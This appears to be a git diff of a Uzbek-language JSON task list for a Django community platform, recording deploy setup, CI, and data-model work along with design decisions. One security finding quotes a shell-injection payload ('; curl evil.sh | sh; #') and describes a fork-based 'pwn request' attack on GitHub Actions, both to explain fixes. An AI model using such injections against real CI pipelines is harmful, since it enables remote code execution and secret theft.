@@ -5,18 +5,64 @@
   "yaratilgan": "2026-08-24",
   "manba": "biznes-arxitektura-rejasi.md tahlili + front-end beta maketi",
   "izoh": "Biznes-arxitektura rejasidagi bo'shliqlar asosida tuzilgan ish ro'yxati. Har bir taskda 'nega' maydoni bor — bu eng muhim qism, chunki u tartibni belgilaydi. Holat qiymatlari: todo | doing | done | blocked | wontfix.",
-
   "fazalar": [
-    { "id": "M0", "nom": "Poydevor", "tartib": 1, "maqsad": "Skelet, muhit, CI, erta deploy. Kod yozishdan oldin bir marta to'g'ri qilinadi.", "taxminiy": "1 hafta" },
-    { "id": "M1", "nom": "Yadro (MVP)", "tartib": 2, "maqsad": "Muammo yozish, yechim berish, ovoz berish, lenta. Mahsulotning yuragi.", "taxminiy": "3 hafta" },
-    { "id": "M2", "nom": "Xavfsizlik va moderatsiya", "tartib": 3, "maqsad": "OMMAVIY ISHGA TUSHIRISHDAN OLDIN MAJBURIY. Kechiktirib bo'lmaydi.", "taxminiy": "2 hafta" },
-    { "id": "M3", "nom": "Gamifikatsiya va profil", "tartib": 4, "maqsad": "Karma, nishonlar, reyting, ekspert profili.", "taxminiy": "1.5 hafta" },
-    { "id": "M4", "nom": "Qidiruv va SEO", "tartib": 5, "maqsad": "Organik trafik — rejadagi asosiy o'sish kanali.", "taxminiy": "1.5 hafta" },
-    { "id": "M5", "nom": "Telegram va bildirishnomalar", "tartib": 6, "maqsad": "Qaytib kelish sikli (retention loop).", "taxminiy": "1.5 hafta" },
-    { "id": "M6", "nom": "Monetizatsiya", "tartib": 7, "maqsad": "PRO obuna, Boost, to'lov tizimlari. Auditoriya shakllangandan KEYIN.", "taxminiy": "2 hafta" },
-    { "id": "M7", "nom": "Ishga tushirish va kuzatuv", "tartib": 8, "maqsad": "Sentry, zaxira, yuk testi, sovuq start rejasi.", "taxminiy": "1 hafta" }
+    {
+      "id": "M0",
+      "nom": "Poydevor",
+      "tartib": 1,
+      "maqsad": "Skelet, muhit, CI, erta deploy. Kod yozishdan oldin bir marta to'g'ri qilinadi.",
+      "taxminiy": "1 hafta"
+    },
+    {
+      "id": "M1",
+      "nom": "Yadro (MVP)",
+      "tartib": 2,
+      "maqsad": "Muammo yozish, yechim berish, ovoz berish, lenta. Mahsulotning yuragi.",
+      "taxminiy": "3 hafta"
+    },
+    {
+      "id": "M2",
+      "nom": "Xavfsizlik va moderatsiya",
+      "tartib": 3,
+      "maqsad": "OMMAVIY ISHGA TUSHIRISHDAN OLDIN MAJBURIY. Kechiktirib bo'lmaydi.",
+      "taxminiy": "2 hafta"
+    },
+    {
+      "id": "M3",
+      "nom": "Gamifikatsiya va profil",
+      "tartib": 4,
+      "maqsad": "Karma, nishonlar, reyting, ekspert profili.",
+      "taxminiy": "1.5 hafta"
+    },
+    {
+      "id": "M4",
+      "nom": "Qidiruv va SEO",
+      "tartib": 5,
+      "maqsad": "Organik trafik — rejadagi asosiy o'sish kanali.",
+      "taxminiy": "1.5 hafta"
+    },
+    {
+      "id": "M5",
+      "nom": "Telegram va bildirishnomalar",
+      "tartib": 6,
+      "maqsad": "Qaytib kelish sikli (retention loop).",
+      "taxminiy": "1.5 hafta"
+    },
+    {
+      "id": "M6",
+      "nom": "Monetizatsiya",
+      "tartib": 7,
+      "maqsad": "PRO obuna, Boost, to'lov tizimlari. Auditoriya shakllangandan KEYIN.",
+      "taxminiy": "2 hafta"
+    },
+    {
+      "id": "M7",
+      "nom": "Ishga tushirish va kuzatuv",
+      "tartib": 8,
+      "maqsad": "Sentry, zaxira, yuk testi, sovuq start rejasi.",
+      "taxminiy": "1 hafta"
+    }
   ],
-
   "tasklar": [
     {
       "id": "D0-T1",
@@ -24,7 +70,10 @@
       "nom": "Django skelet: config/settings bo'linishi va apps/ tuzilishi",
       "tavsif": "config/settings/{base,dev,prod,test}.py; apps/ katalogi ostida domen bo'yicha ilovalar (accounts, complaints, solutions, moderation, gamification, payments, notifications, common).",
       "nega": "Bitta katta ilova 3 oydan keyin ajratilmaydigan bo'lib qoladi. Domen chegaralarini boshida chizish keyingi barcha ishni arzonlashtiradi.",
-      "ustuvorlik": "P0", "hajm": "M", "bogliq": [], "holat": "done",
+      "ustuvorlik": "P0",
+      "hajm": "M",
+      "bogliq": [],
+      "holat": "done",
       "tugatilgan": "2026-08-24",
       "qabul_mezoni": [
         "DJANGO_SETTINGS_MODULE muhit o'zgaruvchisi orqali almashadi",
@@ -57,7 +106,12 @@
       "nom": "Maxsus User modeli (AUTH_USER_MODEL)",
       "tavsif": "apps/accounts/models.py da AbstractUser dan meros. Maydonlar: telegram_id (unique, null), username, karma_cached, is_expert, is_banned, created_at.",
       "nega": "⚠️ ENG BIRINCHI MIGRATSIYADA qilinishi SHART. Keyinroq User modelini almashtirish Django'da eng og'riqli migratsiya — amalda bazani noldan qurishga to'g'ri keladi.",
-      "ustuvorlik": "P0", "hajm": "S", "bogliq": ["D0-T1"], "holat": "done",
+      "ustuvorlik": "P0",
+      "hajm": "S",
+      "bogliq": [
+        "D0-T1"
+      ],
+      "holat": "done",
       "tugatilgan": "2026-08-25",
       "qabul_mezoni": [
         "AUTH_USER_MODEL = 'accounts.User' birinchi migratsiyada",
@@ -85,7 +139,12 @@
       "nom": "Docker Compose: web, db, redis, celery-worker, celery-beat, nginx",
       "tavsif": "Dockerfile (multi-stage), docker-compose.yml, healthcheck'lar, volume'lar.",
       "nega": "Redis va Celery reja bo'yicha 3-bosqichda kerak, lekin konteynerlarni boshida qo'shish keyin qo'shishdan arzon.",
-      "ustuvorlik": "P0", "hajm": "M", "bogliq": ["D0-T1"], "holat": "done",
+      "ustuvorlik": "P0",
+      "hajm": "M",
+      "bogliq": [
+        "D0-T1"
+      ],
+      "holat": "done",
       "tugatilgan": "2026-08-25",
       "qabul_mezoni": [
         "docker compose up -d bilan hammasi ko'tariladi",
@@ -124,9 +183,16 @@
       "nom": "Muhit konfiguratsiyasi va .env.example",
       "tavsif": "django-environ yoki os.environ; .env.example barcha kalitlar bilan (izohlangan); .env gitignore'da.",
       "nega": "Sirlar kodga tushib ketmasligi uchun. .env.example bo'lmasa yangi muhit ko'tarish har safar taxmin qilishga aylanadi.",
-      "ustuvorlik": "P0", "hajm": "S", "bogliq": ["D0-T1"], "holat": "done",
+      "ustuvorlik": "P0",
+      "hajm": "S",
+      "bogliq": [
+        "D0-T1"
+      ],
+      "holat": "done",
       "tugatilgan": "2026-08-25",
-      "qabul_mezoni": [".env.example da SECRET_KEY, DATABASE_URL, REDIS_URL, TELEGRAM_BOT_TOKEN, SENTRY_DSN bor va izohlangan"],
+      "qabul_mezoni": [
+        ".env.example da SECRET_KEY, DATABASE_URL, REDIS_URL, TELEGRAM_BOT_TOKEN, SENTRY_DSN bor va izohlangan"
+      ],
       "natija": {
         "modul": "config/settings/env.py — .env yuklovchi + turga o'girish + DATABASE_URL tahlili",
         "testlar": "29 ta test (apps/common/tests.py); jami loyihada 47 ta, hammasi o'tadi",
@@ -154,9 +220,17 @@
       "nom": "Umumiy abstrakt modellar (apps/common)",
       "tavsif": "TimeStampedModel (created_at, updated_at), SoftDeleteModel (deleted_at + manager), ModeratedModel (moderation_status).",
       "nega": "Kontentni jismonan o'chirish moderatsiya va huquqiy tekshiruvni imkonsiz qiladi. Yumshoq o'chirish boshidan kerak.",
-      "ustuvorlik": "P0", "hajm": "S", "bogliq": ["D0-T1"], "holat": "done",
+      "ustuvorlik": "P0",
+      "hajm": "S",
+      "bogliq": [
+        "D0-T1"
+      ],
+      "holat": "done",
       "tugatilgan": "2026-08-25",
-      "qabul_mezoni": ["default manager o'chirilganlarni CHIQARMAYDI", "all_objects manager hammasini qaytaradi"],
+      "qabul_mezoni": [
+        "default manager o'chirilganlarni CHIQARMAYDI",
+        "all_objects manager hammasini qaytaradi"
+      ],
       "natija": {
         "modellar": "TimeStampedModel, SoftDeleteModel, ModeratedModel, ContentModel (apps/common/models.py)",
         "testlar": "23 ta model testi; loyihada jami 70 ta, hammasi o'tadi",
@@ -178,9 +252,16 @@
       "nom": "Maketni Django template'lariga ko'chirish",
       "tavsif": "frontend/templates/*.html -> base.html + components/. Tailwind build pipeline'ni loyihaga ulash.",
       "nega": "Maket allaqachon Django strukturasini takrorlaydi — ko'chirish mexanik. design-system/MASTER.md 8-bo'limda xarita bor.",
-      "ustuvorlik": "P0", "hajm": "M", "bogliq": ["D0-T1"], "holat": "done",
+      "ustuvorlik": "P0",
+      "hajm": "M",
+      "bogliq": [
+        "D0-T1"
+      ],
+      "holat": "done",
       "tugatilgan": "2026-08-25",
-      "fayllar": ["frontend/design-system/MASTER.md"],
+      "fayllar": [
+        "frontend/design-system/MASTER.md"
+      ],
       "qabul_mezoni": [
         "base.html + components/_complaint_card.html ajratilgan",
         "npm run build static/css/app.css ni yangilaydi",
@@ -209,9 +290,17 @@
       "nom": "Test infratuzilmasi: pytest-django, factory_boy, coverage",
       "tavsif": "pytest.ini, conftest.py, fabrikalar har bir asosiy model uchun, coverage minimal chegarasi.",
       "nega": "Ovoz berish va ko'rinish invariantlari (anonimlik, moderatsiya) qo'lda tekshirib bo'lmaydigan qoidalar — ular testda qotirilishi kerak.",
-      "ustuvorlik": "P0", "hajm": "M", "bogliq": ["D0-T1"], "holat": "done",
+      "ustuvorlik": "P0",
+      "hajm": "M",
+      "bogliq": [
+        "D0-T1"
+      ],
+      "holat": "done",
       "tugatilgan": "2026-08-25",
-      "qabul_mezoni": ["pytest --create-db toza o'tadi", "coverage 70% dan past bo'lsa CI yiqiladi"],
+      "qabul_mezoni": [
+        "pytest --create-db toza o'tadi",
+        "coverage 70% dan past bo'lsa CI yiqiladi"
+      ],
       "natija": {
         "testlar": "106 ta test, qamrov 93.98% (chegara 70%, 99% bilan sinab yiqilishi tasdiqlandi)",
         "konfiguratsiya": "pyproject.toml (pytest.ini EMAS — D0-T8 dagi ruff/black/mypy ham shu faylga tushadi)",
@@ -242,9 +331,16 @@
       "nom": "Kod sifati: ruff, black, mypy, bandit, pre-commit",
       "tavsif": "pre-commit hook'lari; ruff'ga S (bandit) qoidalari qo'shilgan.",
       "nega": "Yolg'iz ishlaganda code review yo'q — linter uning o'rnini bosadi.",
-      "ustuvorlik": "P1", "hajm": "S", "bogliq": ["D0-T1"], "holat": "done",
+      "ustuvorlik": "P1",
+      "hajm": "S",
+      "bogliq": [
+        "D0-T1"
+      ],
+      "holat": "done",
       "tugatilgan": "2026-08-25",
-      "qabul_mezoni": ["pre-commit run --all-files toza"],
+      "qabul_mezoni": [
+        "pre-commit run --all-files toza"
+      ],
       "natija": {
         "holat": "17 hook, 109 fayl, exit 0. ruff check + ruff format + mypy toza. 106 test hali ham o'tadi (qamrov 94%).",
         "qarorlar": [
@@ -270,9 +366,18 @@
       "nom": "GitHub Actions CI",
       "tavsif": "Har push'da: lint, mypy, test (postgres+redis service), coverage.",
       "nega": "Lokalda o'tgan test serverda o'tmasligi mumkin — CI shu farqni ochadi.",
-      "ustuvorlik": "P1", "hajm": "S", "bogliq": ["D0-T7", "D0-T8"], "holat": "done",
+      "ustuvorlik": "P1",
+      "hajm": "S",
+      "bogliq": [
+        "D0-T7",
+        "D0-T8"
+      ],
+      "holat": "done",
       "tugatilgan": "2026-08-26",
-      "qabul_mezoni": ["CI 5 daqiqadan kam vaqtda tugaydi", "yashil bo'lmasa merge bloklanadi"],
+      "qabul_mezoni": [
+        "CI 5 daqiqadan kam vaqtda tugaydi",
+        "yashil bo'lmasa merge bloklanadi"
+      ],
       "natija": {
         "fayl": ".github/workflows/ci.yml — 4 job: sifat, test, docker, ci (yig'ma)",
         "tekshirilgan": [
@@ -304,17 +409,71 @@
       "nom": "ERTA deploy: staging serverga bo'sh loyihani chiqarish",
       "tavsif": "VPS, Nginx, Gunicorn, HTTPS (Let's Encrypt), GitHub Actions orqali deploy.",
       "nega": "Deploy'ni oxiriga qoldirish klassik xato — u yerda topiladigan muammolar (statik fayllar, migratsiya, HTTPS, DNS) har doim kutilganidan ko'p vaqt oladi. Bo'sh loyihani chiqarish arzon, to'la loyihani chiqarish qimmat.",
-      "ustuvorlik": "P0", "hajm": "M", "bogliq": ["D0-T3"], "holat": "todo",
-      "qabul_mezoni": ["staging.dard.uz HTTPS bilan ochiladi", "push -> avtomatik deploy"]
+      "ustuvorlik": "P0",
+      "hajm": "M",
+      "bogliq": [
+        "D0-T3"
+      ],
+      "holat": "qisman",
+      "yangilangan": "2026-08-26",
+      "qabul_mezoni": [
+        "staging.dard.uz HTTPS bilan ochiladi -> ⚠️ DOMEN HALI OLINMAGAN. Bosqich IP orqali, HTTPS'siz. TLS: DEPLOY.md 6-bo'lim",
+        "push -> avtomatik deploy -> kod TAYYOR, server olingandan keyin faollashadi"
+      ],
+      "natija": {
+        "yaratilgan": [
+          "scripts/server_bootstrap.sh — Ubuntu tayyorlash (docker, swap, ufw, fail2ban, SSH qattiqlashtirish)",
+          "deploy/docker-compose.server.yml — serverda ishlaydigan MUSTAQIL stack (obraz tortiladi, qurilmaydi)",
+          "deploy/env.server.example — server .env namunasi",
+          ".github/workflows/deploy.yml — CI yashil bo'lsa SSH orqali chiqaradi",
+          "DEPLOY.md — to'liq runbook (sozlash, rollback, TLS, zaxira, nosozliklar)",
+          ".github/BRANCH_PROTECTION.md"
+        ],
+        "tekshirilgan": [
+          "⭐ LOKAL REPETITSIYA: /opt/dard tuzilishi takrorlanib, prod obrazi bilan butun stack ko'tarildi — 6/6 healthy",
+          "Barcha sahifalar nginx orqali 200 (health, lenta, kategoriyalar, ekspertlar, kirish, admin)",
+          "Migratsiya + collectstatic konteynerda avtomatik bajarildi (132 statik fayl, hash bilan)",
+          "Statikni nginx beradi: app.<hash>.css, Cache-Control public immutable max-age=31536000",
+          "⭐ HTTP orqali admin'ga HAQIQATAN kirildi (302 -> 200, sessiya cookie'si saqlandi)",
+          "Ikkala workflow YAML yaroqli, .sh fayli LF bilan"
+        ],
+        "qarorlar": [
+          "⚠️ BITTA KALIT `DJANGO_HTTPS`: SECURE_SSL_REDIRECT + SESSION_COOKIE_SECURE + CSRF_COOKIE_SECURE + HSTS ni birga boshqaradi. Ilgari cookie'lar qattiq True edi -> TLS'siz serverda brauzer ularni YUBORMAYDI va admin'ga kirib bo'lmaydi, xato esa 'login noto'g'ri' bo'lib ko'rinadi. Yarim holat endi mumkin emas.",
+          "Obrazni CI quradi va GHCR ga yuboradi, server TORTIB oladi — 4GB dropletda `docker build` ishlab turgan Postgres bilan xotira uchun kurashadi va OOM beradi",
+          "docker-compose.server.yml MUSTAQIL (override zanjiri yo'q) — nosozlik paytida 'qaysi qiymat qayerdan keldi?' savoli tug'ilmasin",
+          "db/redis portlari serverda UMUMAN ochilmaydi (ufw ham, compose ham). Kerak bo'lsa SSH tunnel.",
+          "Deploy `workflow_run` orqali — CI yashil bo'lmasa ishga tushmaydi"
+        ],
+        "xavfsizlik_topilmalari": [
+          "⚠️ SEMGREP 'pwn request' ni topdi: `workflow_run` + `checkout` = fork'dan kelgan kod SIRLAR bilan bajarilishi mumkin (hujumchi fork'da branch'ni `main` deb nomlaydi -> `branches: [main]` filtri o'tadi). Himoya shartlari qo'shildi, LEKIN asosiy yechim TUZILISHNI o'zgartirish bo'ldi: deploy endi checkout ham, build ham qilmaydi — obrazni CI quradi. Hujum yuzasi butunlay yo'q qilindi + deploy ~3 daqiqa tezlashdi.",
+          "⚠️ SEMGREP shell injection'ni topdi: `${{ inputs.image_tag }}` to'g'ridan-to'g'ri `run:` ichida edi. GitHub uni skript MATNIGA almashtiradi, ya'ni `; curl evil.sh | sh; #` kod bo'lib bajarilardi. Endi `env:` orqali + teg formati tekshiriladi (SSH orqali masofaviy shellga ketgani uchun ikkinchi qatlam).",
+          "StrictHostKeyChecking=no ISHLATILMAYDI — SSH_KNOWN_HOSTS siri majburiy, aks holda DNS buzilganda kalit begona serverga ketardi"
+        ],
+        "repetitsiyada_topilgan_xatolar": [
+          "⚠️ nginx `location = /health/` blokida proxy_set_header YO'Q edi -> nginx `Host:` ga UPSTREAM NOMINI (`django`) qo'yardi -> Django 400 DisallowedHost. `/` ishlardi, `/health/` yo'q. Oqibati: deploy'dagi sog'liq tekshiruvi HAR SAFAR yiqilardi, sayt esa ishlab turardi. (`proxy_set_header` meros olinmaydi!)",
+          "⚠️ Sog'liq tekshiruvlari `localhost` ishlatardi -> busybox wget uni IPv6 (::1) deb hal qiladi, nginx esa `listen 80` bilan faqat IPv4'da tinglaydi -> 'Connection refused' va nginx MANGU unhealthy. Barcha compose fayllarida 127.0.0.1 ga o'zgartirildi."
+        ],
+        "qolgan_qadamlar": [
+          "1. DigitalOcean droplet (Ubuntu 24.04, 2vCPU/4GB, fra1) + SSH kalit",
+          "2. server_bootstrap.sh ni ishlatish",
+          "3. GitHub repo yaratish + 4 ta secret (SSH_PRIVATE_KEY, SSH_KNOWN_HOSTS, SSH_HOST, SSH_USER)",
+          "4. Branch himoyasi (GitHub sozlamasi, kodda emas)",
+          "5. Domen olingach: TLS (DEPLOY.md 6-bo'lim) + DJANGO_HTTPS=1"
+        ]
+      }
     },
-
     {
       "id": "D1-T1",
       "faza": "M1",
       "nom": "Telegram Login (HMAC tekshiruvi)",
       "tavsif": "Telegram Login Widget; hash'ni bot token'dan olingan SHA256 kalit bilan HMAC orqali tekshirish; auth_date eskirishini nazorat qilish.",
       "nega": "Telegram'dan kelgan ma'lumotni tekshirmasdan qabul qilish = istalgan odam istalgan hisobga kira oladi. auth_date tekshirilmasa eski so'rovni qayta yuborish mumkin (replay).",
-      "ustuvorlik": "P0", "hajm": "M", "bogliq": ["D0-T2"], "holat": "todo",
+      "ustuvorlik": "P0",
+      "hajm": "M",
+      "bogliq": [
+        "D0-T2"
+      ],
+      "holat": "todo",
       "qabul_mezoni": [
         "hash noto'g'ri bo'lsa 403",
         "auth_date 24 soatdan eski bo'lsa rad etiladi",
@@ -327,8 +486,39 @@
       "nom": "Category modeli + boshlang'ich ma'lumot (fixture)",
       "tavsif": "name, slug, icon, description, order, is_active. 8 ta kategoriya fixture'da.",
       "nega": "Kategoriyalar kodda qattiq yozilsa, yangi kategoriya qo'shish deploy talab qiladi.",
-      "ustuvorlik": "P0", "hajm": "S", "bogliq": ["D0-T1"], "holat": "todo",
-      "qabul_mezoni": ["loaddata bilan yuklanadi", "slug unique va URL'da ishlatiladi"]
+      "ustuvorlik": "P0",
+      "hajm": "S",
+      "bogliq": [
+        "D0-T1"
+      ],
+      "holat": "done",
+      "qabul_mezoni": [
+        "loaddata bilan yuklanadi",
+        "slug unique va URL'da ishlatiladi"
+      ],
+      "tugatilgan": "2026-08-27",
+      "natija": {
+        "yaratilgan": [
+          "apps/complaints/models.py — Category (name, slug, icon, description, order, is_active) + CategoryIcon TextChoices",
+          "apps/complaints/fixtures/kategoriyalar.json — 8 kategoriya (maketdagi 7 + 'Boshqa')",
+          "templates/components/_category_icon.html — kalit -> SVG xaritasi",
+          "apps/complaints/admin.py — CategoryAdmin (prepopulated slug, list_editable order/is_active)"
+        ],
+        "tekshirilgan": [
+          "loaddata bilan yuklanadi (8 obyekt) — dev bazasida ham bajarildi",
+          "ikki marta loaddata dublikat yaratmaydi (pk fixture'da qotirilgan)",
+          "slug noyob, get_absolute_url -> /?category=<slug>",
+          "tartib `order` bo'yicha, alifbo bo'yicha EMAS"
+        ],
+        "qarorlar": [
+          "⚠️ `icon` maydonida SVG KODI EMAS, KALIT saqlanadi. SVG matnini bazada saqlab shablonda `|safe` bilan chiqarish har sahifada ishlaydigan XSS teshigi bo'lardi. Kalit yopiq ro'yxatdan tanlanadi va `_category_icon.html` da SVG'ga aylanadi.",
+          "⚠️ Yumshoq o'chirish EMAS, `is_active`: kategoriya — ma'lumotnoma, foydalanuvchi kontenti emas. 'O'chirish' = 'yangi post uchun taklif qilma', 'eski postlarni yo'qot' emas. Complaint.category da on_delete=PROTECT.",
+          "8-kategoriya 'Boshqa' qilib tanlandi (maketda 7 ta bor edi): katch-all bo'lmasa foydalanuvchi noto'g'ri kategoriya tanlaydi va taksonomiya ifloslanadi. order=100 — har doim oxirida."
+        ],
+        "gotchalar": [
+          "⚠️ VAQT YEDI: `loaddata` `auto_now` MAYDONLARINI TO'LDIRMAYDI. Django SQLInsertCompiler.pre_save_val() da ochiq yozgan: xom (raw) yozuvda pre_save() o'tkazib yuboriladi. `created_at` ishlaydi (unda default= bor), `updated_at` esa NULL bo'lib qoladi -> IntegrityError, sababi fixture'ga qaraganda ko'rinmaydi. Yechim: vaqt belgilarini fixture'da OSHKORA berish. Guard test: test_category.py."
+        ]
+      }
     },
     {
       "id": "D1-T3",
@@ -336,12 +526,40 @@
       "nom": "Complaint modeli (rejadagidan kengaytirilgan)",
       "tavsif": "Rejadagi maydonlarga QO'SHIMCHA: slug (SEO), status, moderation_status, views_count, hot_score (indekslangan), solutions_count, updated_at, accepted_solution (FK, null).",
       "nega": "Reja SEO'ni asosiy maqsad deb belgilagan, lekin modelda slug yo'q — /muammo/123 URL'i SEO bermaydi. hot_score maydonisiz 'Qaynoq' saralash har so'rovda hisoblanadi va lenta sekinlashadi.",
-      "ustuvorlik": "P0", "hajm": "M", "bogliq": ["D1-T2"], "holat": "todo",
+      "ustuvorlik": "P0",
+      "hajm": "M",
+      "bogliq": [
+        "D1-T2"
+      ],
+      "holat": "done",
       "qabul_mezoni": [
         "slug avtomatik yaratiladi va unique (sarlavha + qisqa hash)",
         "hot_score va (category, hot_score) bo'yicha indeks bor",
         "URL: /dard/<slug>/"
-      ]
+      ],
+      "tugatilgan": "2026-08-27",
+      "natija": {
+        "yaratilgan": [
+          "apps/complaints/models.py — Complaint(ContentModel, VotableModel): slug, status, moderation_status (meros), views_count, solutions_count, has_expert_answer, hot_score (indeksli), accepted_solution FK, generation_tag, is_anonymous, anon_handle",
+          "apps/complaints/factories.py — CategoryFactory, ComplaintFactory, AnonimComplaintFactory, ComplaintVoteFactory",
+          "apps/complaints/admin.py — ComplaintAdmin"
+        ],
+        "tekshirilgan": [
+          "slug avtomatik: `sarlavha-<4 bayt hex>` — bir xil sarlavhali ikki post yaratiladi",
+          "slug qayta saqlashda O'ZGARMAYDI (URL barqaror)",
+          "kirillcha sarlavhada `dard-` zaxira asosi ishlaydi (to'liq yechim D4-T2)",
+          "yumshoq o'chirilgan post slugni bo'shatadi, ikki TIRIK post bir xil slug ola olmaydi",
+          "(category_id, hot_score) va hot_score indekslari BAZADA mavjudligi tekshirildi (introspection)",
+          "kontenti bor kategoriya o'chirilmaydi (PROTECT), muallif o'chsa post qoladi (SET_NULL)"
+        ],
+        "qarorlar": [
+          "⚠️ `is_solved` MAYDON EMAS, XOSSA. `status` bilan birga saqlansa ikkita haqiqat manbai bo'lardi (status='closed' + is_solved=True bir vaqtda mumkin, qaysi biri to'g'ri — noma'lum). Filtrlash `status` bo'yicha, ko'rsatish `is_solved` orqali.",
+          "⚠️ ComplaintStatus uchta: open / solved / closed. 'Yopilgan' — muallif kutishni to'xtatdi, yechim topilgani EMAS. Ikkalasini bitta bayroq bilan ko'rsatish D7-T8 'yechilish darajasi' metrikasini buzardi.",
+          "author on_delete=SET_NULL: bitta ketgan odam o'nlab foydali muhokamani o'zi bilan olib ketmasin (D2-T8).",
+          "slug quyrug'i 4 bayt tasodif (~4,3 mlrd variant): to'qnashuvni '-2','-3' bilan hal qilish yozishdan oldin SELECT talab qiladi va poyga holatiga ochiq.",
+          "DESC indeks ATAYLAB qo'shilmadi — PostgreSQL btree'ni ikkala yo'nalishda skanerlaydi (User.karma_cached dagi qaror bilan bir xil)."
+        ]
+      }
     },
     {
       "id": "D1-T4",
@@ -349,11 +567,37 @@
       "nom": "Solution modeli",
       "tavsif": "complaint FK, author FK, content, is_accepted, moderation_status, upvotes_cached, created_at.",
       "nega": "is_accepted bitta muammoda faqat BITTA yechimda true bo'lishi kerak — bu ma'lumotlar bazasi darajasida kafolatlansin.",
-      "ustuvorlik": "P0", "hajm": "S", "bogliq": ["D1-T3"], "holat": "todo",
+      "ustuvorlik": "P0",
+      "hajm": "S",
+      "bogliq": [
+        "D1-T3"
+      ],
+      "holat": "done",
       "qabul_mezoni": [
         "UniqueConstraint(complaint, condition=Q(is_accepted=True))",
         "yangi yechim qabul qilinsa eskisi avtomatik bekor bo'ladi"
-      ]
+      ],
+      "tugatilgan": "2026-08-27",
+      "natija": {
+        "yaratilgan": [
+          "apps/solutions/models.py — Solution(ContentModel, VotableModel) + SolutionVote",
+          "apps/solutions/services.py — accept_solution() / unaccept_solution()",
+          "apps/solutions/factories.py, apps/solutions/admin.py"
+        ],
+        "tekshirilgan": [
+          "UniqueConstraint(complaint, condition=is_accepted) — ikkinchi qabul qilingan yechim IntegrityError beradi",
+          "yangi yechim qabul qilinsa eskisi avtomatik bekor bo'ladi (dev bazasida ham tasdiqlandi)",
+          "begona odam qabul qila olmaydi (PermissionDenied)",
+          "qabulni bekor qilish muammoni OPEN ga qaytaradi",
+          "CheckConstraint: is_accepted va accepted_at birga bo'ladi"
+        ],
+        "qarorlar": [
+          "⚠️ AMALLAR TARTIBI: avval ESKI yechim bekor qilinadi, KEYIN yangisi belgilanadi. Teskari tartibda noyoblik indeksi DARHOL buziladi — PostgreSQL uni har UPDATE dan keyin tekshiradi (indeks DEFERRABLE emas).",
+          "⚠️ Noyoblik shartida `deleted_at__isnull=True` BOR. Usiz: moderator qabul qilingan yechimni o'chirsa, qator bazada qoladi va 'qabul qilingan' o'rnini band qiladi -> muallif boshqasini qabul qilolmaydi, ekranda esa hech qanday qabul qilingan yechim yo'q.",
+          "Ruxsat tekshiruvi KO'RINISHDA emas, XIZMATDA: bu funksiya keyin bot (D5-T2) va admin buyruqlaridan ham chaqiriladi.",
+          "`is_anonymous` Solution'ga ham qo'shildi (rejadagi ro'yxatda YO'Q edi): platformaning va'dasi savol berishga ham, JAVOB berishga ham tegishli. Karma baribir haqiqiy hisobga yoziladi."
+        ]
+      }
     },
     {
       "id": "D1-T5",
@@ -361,13 +605,43 @@
       "nom": "⚠️ Vote modeli — rejada YO'Q, lekin MAJBURIY",
       "tavsif": "ComplaintVote va SolutionVote (yoki umumiy Vote): user FK, target FK, value (+1/-1), created_at. unique_together(user, target). Denormalizatsiya: target.upvotes_cached F() ifodasi bilan yangilanadi.",
       "nega": "Rejadagi 'upvotes' butun son bilan: (1) bir odam cheksiz ovoz bera oladi, (2) ovozni qaytarib bo'lmaydi, (3) 'men ovoz berganmanmi?' savoliga javob yo'q — maketdagi aria-pressed holatini to'ldirib bo'lmaydi, (4) soxta ovozlarni tozalab bo'lmaydi. Bu keyinroq tuzatilmaydigan qaror.",
-      "ustuvorlik": "P0", "hajm": "M", "bogliq": ["D1-T3", "D1-T4"], "holat": "todo",
+      "ustuvorlik": "P0",
+      "hajm": "M",
+      "bogliq": [
+        "D1-T3",
+        "D1-T4"
+      ],
+      "holat": "done",
       "qabul_mezoni": [
         "DB darajasida unique cheklov (user + target)",
         "Sanoqchi F() bilan yangilanadi (race condition yo'q)",
         "Qarama-qarshi ovozga almashish 2 birlik farq beradi",
         "Bir foydalanuvchi ikki marta ovoz berishga urinsa test yiqiladi"
-      ]
+      ],
+      "tugatilgan": "2026-08-27",
+      "natija": {
+        "yaratilgan": [
+          "apps/common/models.py — VoteValue, VotableModel (upvotes_cached/downvotes_cached/score_cached), VoteModel abstrakt asos",
+          "apps/common/voting.py — cast_vote() va user_votes_for()",
+          "apps/complaints/models.py — ComplaintVote; apps/solutions/models.py — SolutionVote"
+        ],
+        "tekshirilgan": [
+          "DB darajasidagi UniqueConstraint(user, target) — takroriy ovoz IntegrityError",
+          "yangi ovoz / bekor qilish / almashtirish uchala holati",
+          "⭐ qarama-qarshi ovozga almashish AYNAN 2 birlik farq beradi (dev bazasida ham: +1 -> -1, farq -2)",
+          "sanoqchi ovoz jadvalidan qayta hisoblanadi (kesh haqiqatga mos)",
+          "score_cached ga yozib bo'lmaydi (GENERATED ustun)",
+          "user_votes_for BITTA so'rov, kirmagan foydalanuvchida NOL so'rov (django_assert_num_queries)"
+        ],
+        "qarorlar": [
+          "⚠️ OCHIQ QAROR Q1 YOPILDI: alohida jadvallar (ComplaintVote, SolutionVote) + umumiy abstrakt asos. Ovoz — eng ko'p yoziladigan jadval; umumiy ContentType jadvalida indeks kengroq, JOIN qimmatroq va eng muhimi BAZA DARAJASIDA FK BUTUNLIGI YO'Q (o'chirilgan postning ovozlari yetim qoladi).",
+          "⚠️ IKKITA sanoqchi + GENERATED score_cached (uchta qo'l bilan yangilanadigan ustun EMAS). Faqat score saqlansa 10 up/8 down olgan qizg'in post bilan ovozsiz post bir xil ko'rinardi (M2 moderatsiya uchun bu farq muhim). Uchinchi ustunni qo'lda yangilash esa uchinchi drift manbai bo'lardi — GENERATED ustunni PostgreSQL o'zi hisoblaydi va u sanoqchilardan FARQ QILA OLMAYDI.",
+          "⚠️ POYGA HOLATI ikki qatlamda yopildi: (1) yangi ovoz darhol INSERT qilinadi va noyoblik cheklovi buzilishiga TAYANILADI ('avval so'rab ko'rish' o'rniga); (2) mavjud ovoz select_for_update() bilan qulflanadi. Ichki atomic() — savepoint, usiz IntegrityError butun tranzaksiyani yaroqsiz qilardi.",
+          "⚠️ Sanoqchi `_base_manager` orqali yangilanadi, `objects` orqali EMAS: `objects` yumshoq o'chirilganlarni filtrlaydi va u holda update() hech nimani o'zgartirmasdi, XATO HAM BERMASDI.",
+          "PositiveIntegerField manfiy qiymatda IntegrityError beradi — ATAYLAB: sanoqchi noldan pastga tushayotgan bo'lsa u allaqachon haqiqatdan uzilgan.",
+          "maket `_vote.html` `upvotes_cached` o'rniga `score_cached` ko'rsatadigan qilib tuzatildi (strelkalar orasidagi raqam — SOF ball)."
+        ]
+      }
     },
     {
